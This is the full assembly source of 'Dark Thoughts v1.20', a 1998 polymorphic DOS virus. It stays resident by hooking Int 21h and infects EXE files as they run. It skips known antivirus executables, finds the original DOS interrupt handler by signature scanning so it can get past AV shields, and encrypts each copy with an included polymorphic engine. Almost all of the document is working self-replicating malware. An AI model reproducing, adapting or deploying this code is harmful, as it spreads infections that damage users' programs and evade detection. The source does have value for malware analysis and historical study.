   ;Virus Name: DARK THOUGHTS v1.20
   ;Origin    : Europe/Greece
   ;Author    : ANAKTAS
   ;
   ;GENERAL INFO:
   ;   -Size: Increase files by 6144 bytes.
   ;   -TSR EXE infector
   ;   -Polymorphic by using ENTHELECHIA v1.0 (Source in enthel.SPL)
   ;   -UMB Resident
   ;   -Seeks Original Int 21h by using signatures
   ;    instead of tunneling.
   ;
   ; This virus is actually vanitas II with some changes.
   ; I wrote it to demostrate my poly engine ENTHELECHIA V1.0.
   ;_______________________________________________________


   APPLYSIZE  equ  6144
   BUFFERSIZE equ 16384
   ALOCSIZE   equ 22528+1024

   CODE SEGMENT
   ASSUME CS:CODE,DS:CODE,ES:CODE

   org 0000h
   VIRUS_V:

   ;-------------------------place-decryptor-Here------------------------
   ;Decryptor Will destroy DS or ES(makes it ecual to CS)
   ;_________________________________________________________________

   startofvirusbody:

         ;get delta offset in BP
       mov bp,0


   ;save PSP
       mov ax,ds
           mov bx,cs
           cmp ax,bx
           Jnz SavePSP
           mov ax,es
   savePSP:mov ds,ax
       mov es,ax
       mov cs:[BP+datasegm],ax


   ; am i in memory ?
       mov ax,3700h
       mov bx,0FACEh
       int 21h
       cmp ax,0FACEh
       jnz not_in_mem
       jmp giveCPU
       not_in_mem:

   ;scans for original INT21h.
          call scan21


   ;check if we are in protected mode (Windows,Win95,OS/2)
   ;if yes, don't try to stay in memory but infect some files...
        mov ax,1687h
        int 2Fh
        or ax,ax
        jnz no_DPMI

   ;allocate memory for buffer
       mov bx,ALOCSIZE/16
       call alloc_mem
       mov ax,ds
           mov cs:[BP+buffer],ds

   ;infect Command.com
       call infect_command

   ;release buffer
            mov ax,cs:[BP+buffer]
        mov es,ax
        mov ah,49h
        int 21h

        jmp giveCPU
   no_DPMI:

   ;allocate memory for buffer and for code
       mov bx,ALOCSIZE/16
       call alloc_UMB
           jc stay_in_conv
           mov cs:[BP+buffer],ds

   ;infect Command.com
       call infect_command

       mov bx,ALOCSIZE/16
       call alloc_UMB
       jc stay_in_conv
       jmp Yes_UMB

   ;No UMB - use_oldtrick
   ;----------------------------------------
   stay_in_conv:

   ;Move code next to PSP.
   ;only a small part to avoid overwritting
       push cs
       pop ds
           mov ax,cs:[BP+datasegm]
       add ax,10h
       mov es,ax
           mov di,0
           mov si,bp
           mov cx,offset firstpart
       cld
       rep movsb

   ; Pass the mic to the TSR  copy of virus
           mov ax,es
           push ax
           mov ax,offset Warp
       push ax
       retf
       Warp:

           xor BP,BP ;Delta offset is zero now.

   ;now copy the rest!
           mov cx,APPLYSIZE
           sub cx,offset firstpart
           cld
       rep movsb
       jmp firstpart ;clean-up prefetch queue
       firstpart:

   ;resize host
           mov ax,cs:[datasegm]
       mov es,ax
       mov bx,ALOCSIZE/16
       mov ah,4ah
       int 21h

   ;new buffer
           mov ax,cs:[datasegm] ;PSP
           add ax,10h       ;+PSP=viruscode
       add ax,APPLYSIZE/16   ;+virussize= end of viruscode
       mov cs:[buffer],ax ;buffer

   ;infect Command.com
       call infect_command

   ;Redirect Interrupt 21h to new21
       mov ax,2521h
       push cs
       pop ds
       mov dx,offset new21
       int 21h

   ; Create parametre block
       push cs
       pop es
       mov bx,offset envir
       mov ax,ds:[datasegm]
       mov ds:[line+2],ax
       mov ds:[FCB1+2],ax
       mov ds:[FCB2+2],ax
       mov ax,80h
       mov ds:[line],ax
       mov ax,5Ch
       mov ds:[FCB1],ax
       mov ax,6Ch
       mov ds:[FCB2],ax
       mov ds,ds:[datasegm]
       mov ax,ds:[2ch] ;
       mov cs:[envir],ax    ;  ds=enviroment

       mov ds,ax  ;ds=enviroment


   ; Locate filename.
       mov di,0ffffh
       xixi:
       inc di
       mov ax,ds:[di]
       cmp ax,0000
       jnz xixi
       add di,4
       mov dx,di

   ; Move stack to the end of allocated memory.
       cli
       mov ax,cs
       mov ss,ax
       mov sp,APPLYSIZE
       sti

   ; Execution of the host (EXEC)

       mov ax,4b00h
       call dos21
       cli
       mov ax,cs    ; Recall stack area. Exec might destroy SS and SP.
       mov ss,ax
       mov sp,APPLYSIZE
       sti

   ; Get exit-code of the host
       MOV AH,4Dh
       INT 21h      ; By returning the same return-code.

   ;Return to dos by returning the same exit-code(errorlevel).
       mov ah,31h
       mov dx,ALOCSIZE/16  ;keep bytes in memory
       int 21h
   ;--------------------------------------

   Yes_UMB:
   ;copy virus code to the reserved memory
       push ds
       pop es
       push cs
       pop ds
       mov di,0
           mov si,BP
       mov cx,APPLYSIZE
       rep movsb

   ;Redirect Interrupt 21h to new21
       mov ax,2521h
       push es
       pop ds
           lea dx,[BP+new21]
       int 21h              ; now!

   giveCPU:
   ;calculate original entry-point and PUSH it...
           mov ax,cs
           sub ax,cs:[BP+entry+2]
       push ax
           mov ax,cs:[BP+entry]
       push ax
   ;GET DS/ES
           mov ax,cs:[BP+datasegm]
       mov ds,ax
       mov es,ax
   ; AX=BX=CX=DX=SI=DI=BP=0000
       xor ax,ax
       xor bx,bx
       xor cx,cx
       xor dx,dx
       xor di,di
       xor si,si
       xor bp,bp
       retf ;jmp to the original entry-point
   ;---------------------------------------------------------------








   ;________________________________________________________________
   ;The new Interrupt 21h handler!
   ;----------------------------------------------------------------
       new21:
       pushf
       cli

   ;verifies that virus has already hook int21h
       cmp ax,3700h     ; asking for command line switch chracter...
       jnz not_verify
       cmp bx,0FACEh    ; or for me?
       jnz not_verify
       call dword ptr cs:[adr21]
       mov ax,bx        ; Yes, i am here!
       iret
       not_verify:


       push ax ; push them...

           xor Ah,4bh ;Execute  file?
       jz filefuc
       xor Ah,4bh


   ;   xor ah,3Dh ; open file?
   ;   jz filefuc
   ;   xor ah,3Dh


   ;   xor ah,56h ; rename file?
   ;   jz filefuc
   ;   xor ah,56h

   ;   xor ah,43h ; get file atribs?
   ;   jz filefuc
   ;   xor ah,43h

   ;   mov dx,si
   ;   xor ah,6Ch ; Extented open?
   ;   jz filefuc
   ;   xor ah,6Ch


       jmp notfilefuc

   filefuc:
       pop ax
       mov cs:[BP+filename+2],dx
       call dword ptr cs:[adr21]
       mov dx,cs:[BP+filename+2]
       push bp
       xor bp,bp
       call infect ; you have to wait a little!
       pop bp
       iret

   notfilefuc:
       pop ax
       popf
       jmp dword ptr cs:[adr21]
   ;-------------------------------------------------------------







   ;-------------------------------------------------------------
   ;calls the original INT21h bellow drivers,TSR utils, ;AV shields,etc.
   ;-------------------------------------------------------------
   dos21:
   pushf
   call dword ptr cs:[BP+orig_adr21]
   ret
   ;--------------------------------------------------------------








   ;--------------------------------------------------------------
   ;infects files. Assumes that the file name is at DS:DX
   ;--------------------------------------------------------------
   infect:

   ;push them all.
       push ax
       push bx
       push cx
       push si
       push es
       push dx
       push ds
       push bp

   ;backups the entry point.
       mov ax,cs:[BP+entry]
       mov cs:[BP+entrybackup],ax
       mov ax,cs:[BP+entry+2]
       mov cs:[BP+entrybackup+2],ax

   ; saves the filename
   ;don't know why i did that!
       mov cs:[BP+filename+2],dx
       mov cs:[BP+filename],ds

   ;if filename == *AN.* or *OT.* or *EX.* or *86.* or *ND.* don't infect it.
   ;target files are tbscan.exe,tbclean.exe,scan.exe,f-prot.exe and mscdex.exe
   ;Also if file isn't *.EXE or *.COM don't infect it either...
       mov bx,dx
   findend:
       inc bx
       cmp byte ptr ds:[bx],0
       jnz findend
       sub bx,6
       cmp ds:[bx],0444Eh
       jz cant_open
       cmp ds:[bx],03638h
       jz cant_open
       cmp ds:[bx],04E41h
       jz cant_open
       cmp ds:[bx],0544Fh
       jz cant_open
       cmp ds:[bx],05845h
       jz cant_open
       cmp ds:[bx+3],05845h
       jz ComExe
       cmp ds:[bx+3],04F43h
       jnz cant_open
       ComExe:


   ;check for free clusters
       push dx
       mov ah,36h
       mov bx,dx
       mov dl,ds:[bx]
       and dl,0fh
       call dos21
       pop dx
       test bx,bx
       jnz enough_space
       jmp cant_open
   enough_space:

   ;get file's atributes
       mov ax,4300h
       call dos21
           jc cant_open
       mov cs:[BP+atrib],cl ; and save them

   ;is it a sybdir or volume name ?
   ;I whouldn't like that.
       test cx,00011000b
       jnz cant_open


   ;read only file?  Not any more.
       and cx,11111110b
       mov ax,4301h
       call dos21
       jc cant_open    ; Why can't i write on disk? Maybe
               ; write-protected disk or CD-ROM. Game Over.



   ;open file by using the priv 21 handler to prevent
   ;endless recersive (and overflow of stack)
       mov ax,3d92h
       call dos21
       jc cant_open
       mov cs:[BP+handler],ax       ; save the handle to [handler]

   ;_____________________
          jmp bridge1   ;|
   cant_open:           ;|
          jmp cant_open2;|
   bridge1:             ;|
   ;_____________________|

   ;from now on, (data segment) = (code segment)
   ;no need for CS: override
       push cs
       pop ds

   ;get date-time of file and save it
       mov ax,5700h
       mov bx,cs:[BP+handler]
       call dos21
       mov cs:[BP+time],cx ; save date-time
       mov cs:[BP+date],dx

   ;get buffer
       ;mov ds,cs:[BP+buffer]

   ;reads header (first 84h bytes of file)
       mov ah,3fh
       mov bx,cs:[BP+handler]
       mov cx,84h
       ;mov ds,cs:[BP+buffer]
       mov dx,offset header
       call dos21

   ;is that file an EXE ?
       mov ax,5a4dh
       cmp ax,ds:[bp+header]   ;lets check for "MZ" at offset 0000 0000h
       jnz close_file  ;if not close it and wait for the next file

   ;is it infected?
           mov ax,0faceh
           cmp ax,ds:[bp+header+12h]
       jz close_file



   ;Is it a PE (win95 & NT) , NE(win) or .DLL file?
       mov     si,ds:[bp+header+3ch]
           mov     ax,ds:[bp+header+si]
       sub     al,'N'
       and     al,1101b
       cmp     ax,0050h
       jz      close_file   ;if yes then don't infect it


   ;______________________
          jmp bridge2    ;|
   close_file:           ;|
          jmp close_file2;|
   bridge2:              ;|
   ;______________________|

   ;For testing only. Ask before infect a file.
   ;   call    ask_me
   ;   jnz close_file


   ;go to the end of file
       mov ax,4202h
       xor cx,cx
       xor dx,dx
       call dos21

   ;save the size of the file
       mov cs:[BP+size1],ax
       mov cs:[BP+size1+2],dx

   ; if file.size>448Kbyte don't infect it.
       cmp dx,0007h
       jc not2big
       jmp close_file
   not2big:


   ;tells to the header that filesize+=APPLYSIZE/512
   mov word ptr ds:[bp+header+2],ax   ;file_length MOD 512
   and word ptr ds:[bp+header+2],511
   mov cl,9   ; header[bp+header+4] = file_length(DX:AX) DIV 512
   shr ax,cl
   mov cl,7
   shl dx,cl
   add ax,dx
   add ax,(APPLYSIZE/512)+1
   mov word ptr ds:[bp+header+4],ax



   ;add APPLYSIZE bytes. The increase of file size must be known
   ;seems usefull for future use (stealthing)
       mov ah,40h    ; write...
       mov cx,APPLYSIZE   ;
       call dos21    ; bytes.

   ;the virus code must start from a paragraph (*16 bytes)
       add cs:[BP+size1],10h
       and cs:[BP+size1],0FFF0h

       mov dx,ds:[bp+header+8h]
       mov cs:[BP+headersize],dx


   ;copy original entry point to [entry]
   mov ax,ds:[bp+header+14h]
   mov cs:[BP+entry],ax
   mov ax,ds:[bp+header+16h]
   mov cs:[BP+entry+2],ax

   ;loads the size of the file. The place here virus body will be placed
   mov ax,cs:[BP+size1]
   mov dx,cs:[BP+size1+2]

   ;writes the new entry point which points to the virus body
   mov cl,4  ; AX= (DWord DX:AX) / 16
   shr ax,cl
   mov cl,12
   shl dx,cl
   add ax,dx

   sub ax,ds:[bp+header+8]
   mov ds:[bp+header+16h],ax
   sub ax,cs:[BP+entry+2]
   mov cs:[BP+entry+2],ax
   mov ax,100h
   mov ds:[bp+header+14h],ax


   ;set the fucking stack
   ;if its inside the program leave it, else place it inside the virus code
   mov ax,[offset header+10h+bp]   ;get SP
   sub ax,2
   mov cl,4
   shr ax,cl
   add ax,[offset header+0Eh+bp]   ;ax holds the address of stack's head in paragraphs
   sub ax,2
   mov bx,[offset size1+2+bp]
   mov dx,[offset size1+bp]
   mov cl,12
   shl bx,cl
   mov cl,4
   shr dx,cl
   add bx,dx
   cmp ax,bx
   jc dontchangestack
   mov ax,APPLYSIZE
   mov word ptr ds:[offset header+10h+bp],ax ;SP
   mov ax,ds:[offset header+16h+bp] ;SS
   mov word ptr ds:[offset header+0Eh+bp],ax ;SS
   dontchangestack:



   ;put my mark in the place of header Checksum
   mov ax,0faceh
   mov ds:[offset header+12h+bp],ax

   ;writes header from memory to file
   mov ax,4200h            ;go to the beggining
   mov bx,cs:[offset handler+bp]
   xor cx,cx
   xor dx,dx
   call dos21
   mov ah,40h              ;write 84h
   mov bx,cs:[offset handler+bp]
   mov cx,84h
   mov dx,[offset header+bp]
   call dos21              ;go at the end
   mov ax,4200h
   mov cx,word ptr cs:[BP+size1+2]
   mov dx,word ptr cs:[BP+size1]
   call dos21


   ;------POLY-------
   mov ax,cs:[BP+buffer]  ;build the two buffers in ES:0 and DS:0
   mov ds,ax
   add ax,(BUFFERSIZE/16)/2
   mov es,ax

   call splrand  ;randomize SPL variables

   ;set some spl variables
   push bx
   mov bx,1
   mov word ptr es:[EXi_IsCOM],bx   ; set EXE type decryptors

   mov bx,offset startofvirusbody
   mov word ptr es:[EXi_VirusBodyStart],bx   ; set the virusbody  offset

   mov bx, (offset endofvirusbody) - (offset startofvirusbody)
   mov es:[EXi_VirusBodyLength],bx   ; set the virus lenght
   pop bx

   ;move the stack in a big,safe place
   cli
   mov ax,ss
   mov cs:[oldSS],ax
   mov cs:[oldSP],sp
   push cs
   pop ss
   mov sp,APPLYSIZE
   sti

   ;call the engine
   push dx
   push si
   push bp
   mov dx,cs
   mov si,offset spldata
   call splvm     ;build decryptor/encryptor
   pop bp
   pop si
   pop dx

   ;move the stack back in place
   cli
   mov ax,cs:[oldSS]
   mov sp,cs:[oldSP]
   mov ss,ax
   sti


   ;patch the "mov bp,offset" instruction in the beggining of virus
   push bx
   mov bx,es:[EXo_EncryptedVirusBodyOffset]
   mov cs:[bp+1],bx
   pop bx


   ;call the encryptor
   push ds
   push es
   lea ax,[BP+offset returnencrypt];push the return address
   push cs
   push ax
   mov ax,0 ;push the address of the encryptor
   push ds
   push ax
   push cs ; set the source/destination segments
   push ds
   pop es
   pop ds
   db 0CBh ;return(?) to the encryptor
   returnencrypt:
   pop es
   pop ds
   ;------POLY END-------


   mov bx,100h
   mov bx,es:[EXo_DecryptorStart]
   mov cs:[bp+header+14h],bx


   mov ax,4000h     ; writes the encrypted virus to file
   mov bx,cs:[BP+handler]
   mov cx,APPLYSIZE ;
   mov dx,0h        ;
   call dos21       ;


   ;writes header from memory to file
   mov ax,4200h            ;go to the beggining
   mov bx,cs:[BP+handler]
   xor cx,cx
   xor dx,dx
   call dos21
   mov ah,40h              ;write 84h
   mov bx,cs:[BP+handler]
   mov cx,84h
   lea dx,[bp+offset header]
   push cs
   pop ds
   call dos21              ;go at the end
   mov ax,4200h
   mov cx,word ptr cs:[BP+size1+2]
   mov dx,word ptr cs:[BP+size1]
   call dos21


   close_file2:
   mov ah,3eh
   mov bx,cs:[BP+handler]
   call dos21
   cant_open2:

   ;restore Host's entry-point of the current copy of virus.
       mov ax,cs:[BP+entrybackup]
       mov cs:[BP+entry],ax
       mov ax,cs:[BP+entrybackup+2]
       mov cs:[BP+entry+2],ax

   pop bp ;
   pop ds ;
   pop dx ;
   pop es ;
   pop si ;
   pop cx ;
   pop bx ;
   pop ax ;
   ret
   ;_____________________________________________________________



   ;______________________________________________________________
   ;Old but good!!!
   ;________________________________
   ;replaces int21h with new24 handler
   hook24:
       push ds
       push dx
       push cs
       pop  ds
       lea dx,[BP+new24]
       mov ax,2524h
       int 21h
       pop dx
       pop ds
       ret

   ;returns vector of int24 to its owner
   unhook24:
       push ds
       mov ax,cs:[BP+old24+2]
       mov ds,ax
       mov dx,cs:[BP+old24]
       mov ax,2524h
       int 21h
       pop ds
       ret

   ;Special Interrupt 24h error handler which allways returns
   ; "(I)gnore" without asking the user.
   new24:
       xor al,al  ;
       iret       ;

   ;DATA. Address of original Interrupt 24h handler
   old24   dw 0,0
   ;_______________________________________________________________



   ;_______________________________________________________________
   ;Infect well known files
   ;
   ;_______________________________________________________________
   infect_command:

       ret  ;Sorry but win98 fucks everything.

       push ds
       push cs
       pop ds

           lea dx,[BP+offset target2]
           call infect
           lea dx,[BP+offset target1]
       call infect

       pop ds
       ret          ;return();

   ;data
   target1: db "C:\COMMAND.COM",0
   target2: db "C:\WINDOWS\COMMAND.COM",0

   ;______________________________________________________________









   ;_______________________________________________________________
   ;Scan memory for original Int 21h handlers.
   ;It doesn't use tunneling because i dont want to waste Kbytes for
   ;a good one. I use Signatures instead. YES, SIGNATURES!!!
   ;This trick seems to work till microsoft release its first polymorphic
   ;Interrupt handler!
   ;
   ;Scan Engine V1.0b
   ;This Version of Scan21 can detect the location of the folowing Int21s:
   ;Microsoft.Dos.Int21h.V5.00
   ;Microsoft.Dos.Int21h.V6.20
   ;Microsoft.Dos.Int21h.Win95
   ;
   ;Microsoft.Int21h.Win95 reported to be "on the wild"!
   ;_______________________________________________________________
   scan21:
         push ds
         mov ax,3521h        ; get int21 address by using vector table
         int 21h             ; do it!
         mov cs:[BP+adr21],bx   ; and save it to [adr21]
         mov cs:[BP+adr21+2],es ;
         mov cs:[BP+orig_adr21],bx   ; ...and to [orig_adr21] in case we can't
         mov cs:[BP+orig_adr21+2],es ; find original int21h

   ;try to find the original int 21h of DOS v5.00,v6.20 and WIN95

   Dos5:  mov ax,0     ;dos 5.00
          mov bx,40EBh
   Dos5lp:inc ax
          mov ds,ax
          cmp ax,0FFFFh
          jz Dos62
          cmp ds:[bx],80FAh
          jnz Dos5lp
          cmp ds:[bx+2],6CFCh
          jnz Dos5lp
          cmp ds:[bx+4],0D277h
          jnz Dos5lp
          jmp found_21

   Dos62:  mov ax,0     ;dos 6.20
       mov bx,40F8h
   Dos62lp:inc ax
       mov ds,ax
       cmp ax,0FFFFh
       jz Win95
       cmp ds:[bx],80FAh
       jnz Dos62lp
       cmp ds:[bx+2],6CFCh
       jnz Dos62lp
       cmp ds:[bx+4],0D277h
       jnz Dos62lp
       cmp ds:[bx+6],0FC80h
       jnz Dos62lp
       jmp found_21


   Win95:  mov ax,0     ;Win95
          mov bx,04A0h
   Win95lp: inc ax
          mov ds,ax
          cmp ax,0FFFFh
          jz NoFound
       cmp word ptr ds:[bx+5],0F62Eh
          jnz Win95lp
       cmp word ptr ds:[bx+7],3506h
          jnz Win95lp
       cmp word ptr ds:[bx+9],0200h
          jnz Win95lp
       cmp word ptr ds:[bx+0Bh],02074h
          jnz Win95lp
          ;jmp found_21  ;no need to do that.

   found_21:
           mov cs:[bp+orig_adr21],bx
           mov cs:[bp+orig_adr21+2],ds
   NoFound:pop ds
           ret
   ;------------------------------------------------------------------






   ;________________________________________________________________
   ;Resize host and allocate memory
   ;input: bx=paragraphs of neaded memory
   ;output: ds=segment of memory
   ;        carry set=no memmory
   ;________________________________________________________________
   alloc_mem:
       push ax
       push bx
       push cx
       push dx
       push es
       push bx

   ;resize host's memory
       mov ax,cs:[BP+datasegm]
       mov es,ax
       dec ax
       mov ds,ax
       inc bx
       sub word ptr ds:[12h],bx
       mov dx,ds:[3]
       sub dx,bx
       mov bx,dx

       mov ah,4Ah
       int 21h
       mov ah,48h
         pop bx
       int 21h
         pushf

       jc alloc_end
       mov ds,ax
       alloc_end:

         popf

       pop es
       pop dx
       pop cx
       pop bx
       pop ax
       ret
   ;_______________________________________________________________






   ;________________________________________________________________
   ;allocate UMB
   ; input: bx=paragraphs of needed memory
   ;output: carry=0 / ds=segment of memory
   ;        carry set=no memory
   ;________________________________________________________________
   alloc_UMB:
       push ax
       push bx
       push cx
       push dx
       push es
       push bx

   ;inclusion of UMB
       mov ax,05803h
       mov bx,1
       int 21h
   ;search from the end of memory
       mov ax,5801h
       mov bx,81h
       int 21h
   ;allocate BX paragraphs
       mov ah,48h
         pop bx
       int 21h

         pushf  ;save the Carry flag
         push ax;save the segment adress of memory block

   ;no more UMB
       mov ax,05803h
       xor bx,bx
       int 21h
   ;search from the start of memory
       mov ax,5801h
       xor bx,bx
       int 21h

         pop ax
         popf

       jc End_AllocUMB  ;no memory?
       cmp ax,0A000h
       jc End_AllocUMB  ;that's not in Upper Memory!
       mov ds,ax ; pass segment adress to DS

   End_AllocUMB:

       pop es
       pop dx
       pop cx
       pop bx
       pop ax
       ret
   ;_______________________________________________________________




   ;________________________________________________________________
   ;Poly-engine
   include enthelec.inc
   include splVM.inc
   include splrand.inc
   ;________________________________________________________________




   ;__________________________________________________________________
   ;data , data , data...

   ;parametre block for EXEC (4Bh/Int21h)
   envir  dw ?   ;segment of the enviroment
   line   dw 80h ; command line offset
          dw ?   ;    >>    >>  segment
   FCB1   dw 5Ch ; 1st FCB offset
          dw ?   ;  >>  >> segment
   FCB2   dw 6Ch ; 2nd FCB offset
          dw ?   ;  >>  >> segment

   ;general infos about the file to be infected
   filename    dw 0,0
   atrib       db 0
   date        dw 0
   time        dw 0
   size1       dw 0,0
   headersize  dw 0

   ;keep here the entry-point of the host program
   entry       dw 0000,0016 ; first time return to PSP:0  (INT 20h)
   entrybackup dw 0000,0000 ;back up here the [entry] data

   ;segment of the buffer.
   buffer     dw 0


   ;where PSP is.
   datasegm    dw 0

   ;SS:SP before calling the POLY
   oldSS       dw 0
   oldSP       dw 0

   ;file handler
   handler    dw 0

   ;header structure
   header          dw 0
   filesizeMOD dw 0
   filesizeDIV dw 0
       dw 0
   hdrsize dw 0
   minmem  dw 0
   maxmem  dw 0
   stackSS dw 0
   stackSP dw 0
   checksum    dw 0
   initIP  dw 0
   codeCS  dw 0
   relocadr    dw 0
   reloctable db 80h dup (0)


   ;vectors of interrupt21
   orig_adr21  dw 0,0
   adr21       dw 0,0
   adr13       dw 0,0

   ;Virus Message
         db "Dark Thoughts Ve"
             db "r1.20 - EuR(c)98"
             db " by ANAkTAS.    "
         db "Using ENTHELECHIA v1.0 "
             db "Poly-Engine made with SPL."
            ;0123456789ABCDEF


   endofvirusbody:

   CODE ENDS
        END VIRUS_V
   ;________________________________________________________________
